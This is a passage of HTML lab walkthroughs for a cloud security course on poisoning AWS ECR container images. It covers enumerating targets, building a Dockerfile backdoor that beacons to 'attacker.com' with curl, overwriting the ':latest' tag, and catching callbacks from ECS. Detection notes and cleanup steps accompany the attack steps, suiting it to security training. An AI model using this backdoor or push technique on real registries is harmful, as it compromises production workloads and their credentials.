@@ -1,0 +1,1055 @@
+<!-- M13: ECR Supply Chain Attacks — Expert Tier Labs -->
+
+<div class="lab-walkthrough-content" id="M13-L01-content">
+  <div class="lab-objective">
+    <i class="fa-solid fa-crosshairs"></i>
+    <strong>Objective:</strong> Discover ECR repositories (private and public), enumerate container images, scan for vulnerabilities, and identify targets with permissive push policies or insecure tagging practices.
+  </div>
+
+  <div class="lab-disclaimer">
+    <i class="fa-solid fa-triangle-exclamation"></i>
+    <strong>Authorized Testing Only.</strong> This lab is for authorized testing only. Never perform these actions on systems you don't have explicit written permission to test.
+  </div>
+
+  <div class="lab-prereqs">
+    <div class="prereq-title"><i class="fa-solid fa-list-check"></i> Prerequisites</div>
+    <ul>
+      <li>IAM permissions: <code>ecr:DescribeRepositories</code>, <code>ecr:ListImages</code>, <code>ecr:DescribeImages</code>, <code>ecr:GetRepositoryPolicy</code>, <code>ecr-public:DescribeRepositories</code> (public registries require <code>us-east-1</code> region)</li>
+      <li>Docker installed locally for image pulling and inspection</li>
+      <li>Trivy installed: <code>brew install trivy</code> or <a href="https://aquasecurity.github.io/trivy/latest/getting-started/installation/" target="_blank">trivy installation docs</a></li>
+      <li>Grype installed: <code>curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh -s -- -b /usr/local/bin</code></li>
+      <li>AWS CLI configured with credentials that have the above permissions</li>
+    </ul>
+  </div>
+
+  <div class="lab-steps">
+
+    <div class="lab-step">
+      <div class="step-num">1</div>
+      <div class="step-content">
+        <div class="step-desc">List all private ECR repositories in the account, noting their names and URIs. These are potential targets for image poisoning. Also enumerate ECR Public repositories, which are accessible without authentication.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ # Enumerate private ECR repositories
+$ aws ecr describe-repositories \
+    --query 'repositories[*].[repositoryName,repositoryUri]' --output table</div>
+            <div class="terminal-output">-----------------------------------------------------------------
+|                    DescribeRepositories                       |
++-------------------+-------------------------------------------+
+|  webapp           |  123456789012.dkr.ecr.us-east-1.amazonaws.com/webapp          |
+|  api-service      |  123456789012.dkr.ecr.us-east-1.amazonaws.com/api-service     |
+|  base-python      |  123456789012.dkr.ecr.us-east-1.amazonaws.com/base-python     |
+|  nginx-proxy      |  123456789012.dkr.ecr.us-east-1.amazonaws.com/nginx-proxy     |
+|  cron-jobs        |  123456789012.dkr.ecr.us-east-1.amazonaws.com/cron-jobs       |
++-------------------+-------------------------------------------+</div>
+            <div class="terminal-cmd">$ # Enumerate ECR Public repositories — region must be us-east-1
+$ aws ecr-public describe-repositories --region us-east-1</div>
+            <div class="terminal-output">{
+    "repositories": [
+        {
+            "repositoryName": "myorg/base-alpine",
+            "repositoryUri": "public.ecr.aws/a1b2c3d4/base-alpine",
+            "repositoryArn": "arn:aws:ecr-public::123456789012:repository/base-alpine",
+            "createdAt": "2024-06-01T10:00:00.000Z"
+        }
+    ]
+}
+# Public repositories are world-readable — enumerate without credentials</div>
+          </div>
+        </div>
+        <div class="step-note"><i class="fa-solid fa-circle-info"></i> ECR Public is a separate service from private ECR and always lives in <code>us-east-1</code>, regardless of where your workloads run. Public gallery images are usable by anyone as base images — making them attractive targets for the whoAMI-style name confusion attacks discussed in Lab 5.</div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <div class="step-desc">List images in a target repository, looking for <code>:latest</code> tags or mutable tags that can be overwritten with a poisoned image.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws ecr list-images --repository-name webapp \
+    --query 'imageIds[*].[imageTag,imageDigest]' --output table</div>
+            <div class="terminal-output">----------------------------------------------------------------------
+|                          ListImages                                |
++-----------+--------------------------------------------------------+
+|  latest   |  sha256:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2 |
+|  v2.4.1   |  sha256:b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3 |
+|  v2.4.0   |  sha256:c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4 |
+|  v2.3.9   |  sha256:d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5 |
++-----------+--------------------------------------------------------+</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <div class="step-desc">Scan the target image for known CVEs using Trivy and Grype. Vulnerability findings can reveal exploitable components, inform attack selection, and appear in real-world ECR scan findings.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ # Authenticate to ECR first
+$ aws ecr get-login-password --region us-east-1 | \
+    docker login --username AWS --password-stdin \
+    123456789012.dkr.ecr.us-east-1.amazonaws.com
+
+$ # Scan with Trivy — covers OS packages, language libs, and misconfigurations
+$ trivy image 123456789012.dkr.ecr.us-east-1.amazonaws.com/webapp:latest</div>
+            <div class="terminal-output">2026-04-01T14:22:00.000Z INFO Vulnerability scanning is enabled
+123456789012.dkr.ecr.us-east-1.amazonaws.com/webapp:latest (node:18-alpine)
+
+Total: 12 (CRITICAL: 2, HIGH: 4, MEDIUM: 4, LOW: 2)
+
++----------------------------+------------------+----------+------+
+| LIBRARY                    | CVE              | SEVERITY | FIX  |
++----------------------------+------------------+----------+------+
+| openssl                    | CVE-2024-5535    | CRITICAL | 3.3.1|
+| libcrypto3                 | CVE-2024-4741    | CRITICAL | 3.3.1|
+| express                    | CVE-2024-43796   | HIGH     | 4.21 |
+| lodash                     | CVE-2021-23337   | HIGH     | none |
++----------------------------+------------------+----------+------+</div>
+            <div class="terminal-cmd">$ # Cross-validate with Grype for a second opinion
+$ grype 123456789012.dkr.ecr.us-east-1.amazonaws.com/webapp:latest</div>
+            <div class="terminal-output">NAME          INSTALLED  FIXED-IN  TYPE    VULNERABILITY   SEVERITY
+openssl       3.1.4      3.3.1     apk     CVE-2024-5535   Critical
+libcrypto3    3.1.4      3.3.1     apk     CVE-2024-4741   Critical
+express       4.18.2     4.21.0    npm     CVE-2024-43796  High
+lodash        4.17.20    none      npm     CVE-2021-23337  High</div>
+          </div>
+        </div>
+        <div class="step-note"><i class="fa-solid fa-lightbulb"></i> Both Trivy and Grype scan without pushing any data to AWS — they pull the image locally and inspect the layer SBOMs. Use ECR Enhanced Scanning (powered by Inspector/Snyk) for continuous registry-side scanning.</div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">4</div>
+      <div class="step-content">
+        <div class="step-desc">Check the repository policy for overly permissive push access. Cross-account or wildcard principals are high-value findings. Also check image tag mutability settings.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws ecr get-repository-policy --repository-name webapp</div>
+            <div class="terminal-output">{
+    "registryId": "123456789012",
+    "repositoryName": "webapp",
+    "policyText": {
+        "Version": "2012-10-17",
+        "Statement": [
+            {
+                "Sid": "AllowCrossAccountPush",
+                "Effect": "Allow",
+                "Principal": {
+                    "AWS": "arn:aws:iam::345678901234:root"
+                },
+                "Action": [
+                    "ecr:GetDownloadUrlForLayer",
+                    "ecr:BatchGetImage",
+                    "ecr:PutImage",
+                    "ecr:InitiateLayerUpload",
+                    "ecr:UploadLayerPart",
+                    "ecr:CompleteLayerUpload"
+                ]
+            }
+        ]
+    }
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">5</div>
+      <div class="step-content">
+        <div class="step-desc">Identify the best targets: repositories using <code>:latest</code> tag (mutable), with permissive push policies, and no image tag immutability enabled.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ echo "=== TARGET ASSESSMENT ==="
+$ for repo in $(aws ecr describe-repositories \
+    --query 'repositories[*].repositoryName' --output text); do
+    IMMUTABLE=$(aws ecr describe-repositories --repository-names "$repo" \
+        --query 'repositories[0].imageTagMutability' --output text)
+    HAS_LATEST=$(aws ecr list-images --repository-name "$repo" \
+        --query "imageIds[?imageTag=='latest'] | length(@)" --output text)
+    echo "[$repo] TagMutability=$IMMUTABLE HasLatest=$HAS_LATEST"
+done</div>
+            <div class="terminal-output">=== TARGET ASSESSMENT ===
+[webapp] TagMutability=MUTABLE HasLatest=1          &lt;-- HIGH VALUE TARGET
+[api-service] TagMutability=MUTABLE HasLatest=1     &lt;-- HIGH VALUE TARGET
+[base-python] TagMutability=IMMUTABLE HasLatest=0   &lt;-- Protected
+[nginx-proxy] TagMutability=MUTABLE HasLatest=1     &lt;-- HIGH VALUE TARGET
+[cron-jobs] TagMutability=MUTABLE HasLatest=0</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <div class="lab-detection">
+    <div class="detection-title"><i class="fa-solid fa-magnifying-glass"></i> Detection Notes</div>
+    <ul>
+      <li><strong>CloudTrail events:</strong> <code>ecr:DescribeRepositories</code>, <code>ecr:ListImages</code>, <code>ecr:GetRepositoryPolicy</code> in bulk — high-frequency enumeration across many repos in a short window</li>
+      <li>ECR Enhanced Scanning (Inspector) will surface findings when images are pushed or on schedule — monitor for CRITICAL/HIGH CVEs in production repositories</li>
+      <li>Alert on <code>ecr-public:DescribeRepositories</code> calls from IAM principals that have no business reason to access the public registry</li>
+    </ul>
+  </div>
+
+  <div class="lab-mitre">
+    <div class="mitre-title"><i class="fa-solid fa-shield-halved"></i> MITRE ATT&amp;CK Mappings</div>
+    <div class="mitre-tags">
+      <span class="mitre-tag">T1580 — Cloud Infrastructure Discovery</span>
+      <span class="mitre-tag">T1195.002 — Compromise Software Supply Chain</span>
+      <span class="mitre-tag">T1087.004 — Cloud Account Discovery</span>
+    </div>
+  </div>
+
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">Describe Repos</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">List Images</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Scan (Trivy/Grype)</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Check Policies</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node highlight">Identify Targets</div>
+    </div>
+  </div>
+
+  <div class="lab-cleanup">
+    <div class="cleanup-title"><i class="fa-solid fa-broom"></i> Cleanup</div>
+    <p>This lab is read-only enumeration and scanning. No resources are created or modified. Delete any locally pulled Docker images to free disk space: <code>docker image prune -a</code>.</p>
+  </div>
+
+  <div class="lab-note">
+    <i class="fa-solid fa-circle-info"></i> Repositories with <code>imageTagMutability=MUTABLE</code> and active <code>:latest</code> tags are prime targets. Enable tag immutability and use image digest pinning in deployment manifests.
+  </div>
+</div>
+
+<hr class="lab-divider">
+
+<div class="lab-walkthrough-content" id="M13-L02-content">
+  <div class="lab-objective">
+    <i class="fa-solid fa-crosshairs"></i>
+    <strong>Objective:</strong> Poison a production container image by pulling the original, injecting a reliable process-based backdoor (compatible with minimal Alpine/Node images), and preparing it for push back to the registry.
+  </div>
+
+  <div class="lab-disclaimer">
+    <i class="fa-solid fa-triangle-exclamation"></i>
+    <strong>Authorized Testing Only.</strong> This lab is for authorized testing only. Never perform these actions on systems you don't have explicit written permission to test.
+  </div>
+
+  <div class="lab-prereqs">
+    <div class="prereq-title"><i class="fa-solid fa-list-check"></i> Prerequisites</div>
+    <ul>
+      <li>Docker installed and running on attacker machine</li>
+      <li>ECR pull permissions (<code>ecr:GetDownloadUrlForLayer</code>, <code>ecr:BatchGetImage</code>) on the target repository</li>
+      <li>A listener (netcat or Metasploit handler) on your attacker machine at the callback IP and port</li>
+      <li>Attacker-controlled callback host reachable from the target ECS/EKS environment</li>
+      <li>Lab note: the target <code>webapp</code> image is Node.js on Alpine Linux</li>
+    </ul>
+    <div class="prereq-note"><i class="fa-solid fa-triangle-exclamation"></i> <strong>Cron compatibility warning:</strong> Alpine-based Docker images do NOT include a cron daemon by default — adding a cron entry in the Dockerfile will have no effect at runtime because nothing starts <code>crond</code>. Use a process-based persistence pattern instead (see Steps 2-3).</div>
+  </div>
+
+  <div class="lab-steps">
+
+    <div class="lab-step">
+      <div class="step-num">1</div>
+      <div class="step-content">
+        <div class="step-desc">Authenticate to ECR and pull the target image. This gives us the original image to layer our backdoor on top of.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws ecr get-login-password --region us-east-1 | \
+    docker login --username AWS --password-stdin \
+    123456789012.dkr.ecr.us-east-1.amazonaws.com</div>
+            <div class="terminal-output">WARNING! Your password will be stored unencrypted in /root/.docker/config.json.
+Login Succeeded</div>
+            <div class="terminal-cmd">$ docker pull 123456789012.dkr.ecr.us-east-1.amazonaws.com/webapp:latest</div>
+            <div class="terminal-output">latest: Pulling from webapp
+a1b2c3d4e5f6: Pull complete
+b2c3d4e5f6a7: Pull complete
+c3d4e5f6a7b8: Pull complete
+Digest: sha256:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2
+Status: Downloaded newer image for 123456789012.dkr.ecr.us-east-1.amazonaws.com/webapp:latest</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <div class="step-desc">Inspect the original image entrypoint and CMD before modifying — this is critical to understand what to preserve. Blindly replacing ENTRYPOINT will break the application.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ # Inspect the original entrypoint and CMD
+$ docker inspect 123456789012.dkr.ecr.us-east-1.amazonaws.com/webapp:latest \
+    --format '{{json .Config.Entrypoint}} {{json .Config.Cmd}}'</div>
+            <div class="terminal-output">null ["node","server.js"]</div>
+            <div class="terminal-cmd">$ # Image uses default shell entrypoint with CMD ["node","server.js"]
+$ # We must preserve CMD when overriding ENTRYPOINT</div>
+          </div>
+        </div>
+        <div class="step-note"><i class="fa-solid fa-lightbulb"></i> When the original image has no ENTRYPOINT and only uses CMD, setting a new ENTRYPOINT in a derived image will <strong>replace</strong> the CMD execution mechanism. Use the wrapper pattern in Step 3 to preserve application behavior.</div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <div class="step-desc">Create a Dockerfile that injects a reliable process-based backdoor using an ENTRYPOINT wrapper. This pattern works on Alpine images that have no cron daemon, preserves the original application CMD, and beacons persistently via a background loop.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ cat Dockerfile</div>
+            <div class="terminal-output">FROM 123456789012.dkr.ecr.us-east-1.amazonaws.com/webapp:latest
+
+# Process-based persistence — no cron required (Alpine has no crond by default)
+# The ENTRYPOINT wrapper:
+#   1. Starts a background beacon loop that calls back every hour
+#   2. Execs the original CMD, so the application runs normally
+#   "--" separates the wrapper's argument list from "$@" (the CMD args)
+ENTRYPOINT ["/bin/sh", "-c", \
+  "while true; do curl -s http://attacker.com/$(hostname) &amp; sleep 3600; done &amp; exec \"$@\"", \
+  "--"]
+
+# CMD is inherited from the parent image: ["node", "server.js"]
+# exec "$@" above passes CMD args to a new process, replacing the shell
+# This means node server.js becomes PID 1's child — signals work correctly</div>
+          </div>
+        </div>
+        <div class="step-note"><i class="fa-solid fa-triangle-exclamation"></i> <strong>Why not cron?</strong> Node.js, Python, and Go Alpine images are deliberately minimal — they ship without <code>crond</code>, <code>crontabs</code>, or <code>/etc/cron.d</code>. Any cron entries written to those paths will be silently ignored unless <code>crond</code> is separately installed and started. The ENTRYPOINT wrapper pattern above is reliable across all base images.</div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">4</div>
+      <div class="step-content">
+        <div class="step-desc">Build the backdoored image, tagging it as <code>:latest</code> to overwrite the legitimate image when pushed.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ docker build -t 123456789012.dkr.ecr.us-east-1.amazonaws.com/webapp:latest .</div>
+            <div class="terminal-output">Sending build context to Docker daemon  2.048kB
+Step 1/2 : FROM 123456789012.dkr.ecr.us-east-1.amazonaws.com/webapp:latest
+ ---> a1b2c3d4e5f6
+Step 2/2 : ENTRYPOINT ["/bin/sh", "-c", "while true; do curl -s http://attacker.com/$(hostname) &amp; sleep 3600; done &amp; exec \"$@\"", "--"]
+ ---> Running in f6e5d4c3b2a1
+ ---> b2c3d4e5f6a7
+Successfully built b2c3d4e5f6a7
+Successfully tagged 123456789012.dkr.ecr.us-east-1.amazonaws.com/webapp:latest</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">5</div>
+      <div class="step-content">
+        <div class="step-desc">Verify the backdoor and confirm the application still starts correctly. The node process must start (application healthy) while the beacon loop runs in the background.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ # Verify the ENTRYPOINT was set correctly
+$ docker inspect 123456789012.dkr.ecr.us-east-1.amazonaws.com/webapp:latest \
+    --format '{{json .Config.Entrypoint}} {{json .Config.Cmd}}'</div>
+            <div class="terminal-output">["/bin/sh","-c","while true; do curl -s http://attacker.com/$(hostname) &amp; sleep 3600; done &amp; exec \"$@\"","--"] ["node","server.js"]</div>
+            <div class="terminal-cmd">$ # Inspect the image layer history — backdoor appears as a single new layer
+$ docker history 123456789012.dkr.ecr.us-east-1.amazonaws.com/webapp:latest | head -4</div>
+            <div class="terminal-output">IMAGE          CREATED          CREATED BY                                                SIZE
+b2c3d4e5f6a7   1 minute ago     ENTRYPOINT ["/bin/sh", "-c", "while true; do curl ..."]   0B   &lt;-- backdoor layer
+a1b2c3d4e5f6   2 days ago       CMD ["node" "server.js"]                                  0B   &lt;-- original</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <div class="lab-detection">
+    <div class="detection-title"><i class="fa-solid fa-magnifying-glass"></i> Detection Notes</div>
+    <ul>
+      <li><strong>CloudTrail:</strong> <code>ecr:PutImage</code> from an unexpected IAM principal or source IP — especially if the image tag is <code>latest</code> and the calling principal is not the CI/CD pipeline role</li>
+      <li>Image layer hash changes: the digest of the <code>:latest</code> tag will change after the poison push — alert on digest changes for production images not correlated with a pipeline run</li>
+      <li>ECR Enhanced Scanning will flag the new layer's components (curl invocation) as potentially suspicious in some rulesets</li>
+      <li>Container runtime tools (Falco, Sysdig) can detect unexpected outbound network connections from containers post-deployment</li>
+    </ul>
+  </div>
+
+  <div class="lab-mitre">
+    <div class="mitre-title"><i class="fa-solid fa-shield-halved"></i> MITRE ATT&amp;CK Mappings</div>
+    <div class="mitre-tags">
+      <span class="mitre-tag">T1525 — Implant Internal Image</span>
+      <span class="mitre-tag">T1195.002 — Compromise Software Supply Chain</span>
+      <span class="mitre-tag">T1610 — Deploy Container</span>
+    </div>
+  </div>
+
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">Pull Original</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Inspect Entrypoint</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Inject Wrapper</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Build + Tag :latest</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node highlight">Ready to Push</div>
+    </div>
+  </div>
+
+  <div class="lab-cleanup">
+    <div class="cleanup-title"><i class="fa-solid fa-broom"></i> Cleanup</div>
+    <p>Remove the locally built backdoored image before proceeding. Do not push this image unless you are in an isolated lab environment with explicit authorization:</p>
+    <div class="terminal">
+      <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal — Cleanup</div>
+      <div class="terminal-body">
+        <div class="terminal-cmd">$ docker rmi 123456789012.dkr.ecr.us-east-1.amazonaws.com/webapp:latest
+$ docker image prune -f</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="lab-note">
+    <i class="fa-solid fa-circle-info"></i> The backdoor adds only a single metadata layer (0B size change for ENTRYPOINT) making the modification size-invisible. Without image signing (Notation/Cosign) or admission controllers validating digests, this change is undetectable to most deployment pipelines.
+  </div>
+</div>
+
+<hr class="lab-divider">
+
+<div class="lab-walkthrough-content" id="M13-L03-content">
+  <div class="lab-objective">
+    <i class="fa-solid fa-crosshairs"></i>
+    <strong>Objective:</strong> Push the backdoored container image to ECR, overwriting the legitimate <code>:latest</code> tag, and catch a callback when ECS auto-deploys the poisoned image.
+  </div>
+
+  <div class="lab-disclaimer">
+    <i class="fa-solid fa-triangle-exclamation"></i>
+    <strong>Authorized Testing Only.</strong> This lab is for authorized testing only. Never perform these actions on systems you don't have explicit written permission to test.
+  </div>
+
+  <div class="lab-prereqs">
+    <div class="prereq-title"><i class="fa-solid fa-list-check"></i> Prerequisites</div>
+    <ul>
+      <li>Completion of Lab 2 — backdoored image built and tagged locally</li>
+      <li>ECR push permissions: <code>ecr:PutImage</code>, <code>ecr:InitiateLayerUpload</code>, <code>ecr:UploadLayerPart</code>, <code>ecr:CompleteLayerUpload</code>, <code>ecr:BatchCheckLayerAvailability</code></li>
+      <li>Target repository must have <code>imageTagMutability=MUTABLE</code> (confirmed in Lab 1)</li>
+      <li>Listener ready on attacker machine: <code>nc -nlvp 4444</code> or equivalent</li>
+      <li>Network connectivity between ECS tasks and your attacker callback host</li>
+    </ul>
+  </div>
+
+  <div class="lab-steps">
+
+    <div class="lab-step">
+      <div class="step-num">1</div>
+      <div class="step-content">
+        <div class="step-desc">Authenticate to ECR. The <code>get-login-password</code> token is valid for 12 hours.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws ecr get-login-password --region us-east-1 | \
+    docker login --username AWS --password-stdin \
+    123456789012.dkr.ecr.us-east-1.amazonaws.com</div>
+            <div class="terminal-output">Login Succeeded</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <div class="step-desc">Push the backdoored image, overwriting the legitimate <code>:latest</code> tag. This is the point of no return — the supply chain is now poisoned.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ docker push 123456789012.dkr.ecr.us-east-1.amazonaws.com/webapp:latest</div>
+            <div class="terminal-output">The push refers to repository [123456789012.dkr.ecr.us-east-1.amazonaws.com/webapp]
+d4e5f6a7b8c9: Pushed
+f6a7b8c9d0e1: Layer already exists
+a7b8c9d0e1f2: Layer already exists
+b8c9d0e1f2a3: Layer already exists
+latest: digest: sha256:deadbeef1234567890abcdef1234567890abcdef12345678 size: 1789</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <div class="step-desc">Verify the image was replaced by checking the new digest. The digest has changed from the original — the backdoor is now live in the registry.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws ecr describe-images --repository-name webapp \
+    --image-ids imageTag=latest \
+    --query 'imageDetails[0].{digest:imageDigest,pushed:imagePushedAt,size:imageSizeInBytes}'</div>
+            <div class="terminal-output">{
+    "digest": "sha256:deadbeef1234567890abcdef1234567890abcdef12345678",
+    "pushed": "2026-04-01T14:35:22.000Z",
+    "size": 234569078
+}
+# Original digest was sha256:a1b2c3d4... — now replaced with sha256:deadbeef...</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">4</div>
+      <div class="step-content">
+        <div class="step-desc">Wait for ECS to pull the poisoned image. Services using <code>:latest</code> will pull the backdoored version on the next deployment, rolling update, or task restart.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ # Monitor ECS for new task deployments
+$ aws ecs describe-services --cluster production \
+    --services webapp-service \
+    --query 'services[0].{desired:desiredCount,running:runningCount,deployments:deployments[*].{id:id,status:status,updated:updatedAt}}'</div>
+            <div class="terminal-output">{
+    "desired": 3,
+    "running": 3,
+    "deployments": [
+        {
+            "id": "ecs-svc/8675309123456789",
+            "status": "PRIMARY",
+            "updated": "2026-04-01T14:40:00.000Z"
+        }
+    ]
+}
+# Force new deployment to trigger immediate pull (if authorized):
+# aws ecs update-service --cluster production --service webapp-service --force-new-deployment</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">5</div>
+      <div class="step-content">
+        <div class="step-desc">Receive the beacon callback from the deployed container. Each new task instance will beacon on startup and every hour, giving ongoing visibility into the ECS execution environment and access to the task role credentials.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ # Simple HTTP log listener on attacker machine
+$ python3 -m http.server 80</div>
+            <div class="terminal-output">Serving HTTP on 0.0.0.0 port 80 ...
+10.0.2.47 - - [01/Apr/2026 14:41:05] "GET /ip-10-0-2-47.ec2.internal HTTP/1.1" 200 -
+10.0.2.48 - - [01/Apr/2026 14:41:07] "GET /ip-10-0-2-48.ec2.internal HTTP/1.1" 200 -
+10.0.2.49 - - [01/Apr/2026 14:41:09] "GET /ip-10-0-2-49.ec2.internal HTTP/1.1" 200 -
+# All 3 ECS task instances beaconed — supply chain attack confirmed</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <div class="lab-detection">
+    <div class="detection-title"><i class="fa-solid fa-magnifying-glass"></i> Detection Notes</div>
+    <ul>
+      <li><strong>Key CloudTrail event:</strong> <code>ecr:PutImage</code> — alert on any push to the <code>:latest</code> tag in production repositories not originating from the CI/CD pipeline service role</li>
+      <li>Image layer hash change: <code>imagePushedAt</code> timestamp and <code>imageDigest</code> change for <code>:latest</code> without a corresponding pipeline run in your CI system is a high-fidelity indicator</li>
+      <li>ECR Enhanced Scanning (Inspector) generates findings when new layers are pushed — a new image with no CVEs but a fresh push at an unusual time deserves investigation</li>
+      <li>Network egress anomaly: containers making outbound HTTP requests to non-approved external hosts is detectable via VPC Flow Logs and Network Firewall domain allow-lists</li>
+      <li>Container runtime security tools (Falco, Sysdig Secure) can detect the <code>curl</code> spawned by the entrypoint wrapper at container start time</li>
+    </ul>
+  </div>
+
+  <div class="lab-mitre">
+    <div class="mitre-title"><i class="fa-solid fa-shield-halved"></i> MITRE ATT&amp;CK Mappings</div>
+    <div class="mitre-tags">
+      <span class="mitre-tag">T1525 — Implant Internal Image</span>
+      <span class="mitre-tag">T1610 — Deploy Container</span>
+      <span class="mitre-tag">T1071.001 — Application Layer Protocol: Web Protocols</span>
+    </div>
+  </div>
+
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">Auth to ECR</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Push :latest</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">ECS Pulls Image</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node highlight">Beacon Callback</div>
+    </div>
+  </div>
+
+  <div class="lab-cleanup">
+    <div class="cleanup-title"><i class="fa-solid fa-broom"></i> Cleanup</div>
+    <p>Restore the original legitimate image to the <code>:latest</code> tag in ECR. Force a new ECS deployment to replace any running backdoored containers:</p>
+    <div class="terminal">
+      <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal — Cleanup</div>
+      <div class="terminal-body">
+        <div class="terminal-cmd">$ # 1. Re-tag the last known-good image as :latest
+$ # Find the original digest from your notes or pipeline artifacts
+$ ORIGINAL_DIGEST="sha256:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2"
+
+$ # Pull the original digest and re-push as :latest
+$ docker pull 123456789012.dkr.ecr.us-east-1.amazonaws.com/webapp@$ORIGINAL_DIGEST
+$ docker tag 123456789012.dkr.ecr.us-east-1.amazonaws.com/webapp@$ORIGINAL_DIGEST \
+    123456789012.dkr.ecr.us-east-1.amazonaws.com/webapp:latest
+$ docker push 123456789012.dkr.ecr.us-east-1.amazonaws.com/webapp:latest
+
+$ # 2. Force ECS to redeploy with the restored image
